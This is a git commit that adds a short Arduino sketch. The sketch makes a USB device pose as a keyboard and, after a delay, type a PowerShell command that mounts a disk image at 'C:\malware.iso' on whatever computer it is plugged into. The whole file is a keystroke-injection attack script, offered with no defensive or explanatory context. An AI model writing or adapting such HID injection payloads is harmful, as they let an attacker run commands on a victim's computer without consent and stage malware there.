0f8b810171e5ef2b2d632d93f0b8ea889a1bde0c
mohsen akhavan <77884120+mohsenakhavan@users.noreply.github.com>
2025-02-08 22:44:46 +0330

    Create Virtual_CDROM.ino

---
+++ sketches/Virtual_CDROM.ino
@@ -0,0 +1,8 @@
+#include <USBHIDKeyboard.h>
+USBHIDKeyboard Keyboard;
+
+void setup() {
+  Keyboard.begin();
+  delay(3000);
+  Keyboard.println(F("powershell -c \"Mount-DiskImage -ImagePath C:\\malware.iso -StorageType ISO\""));
+}
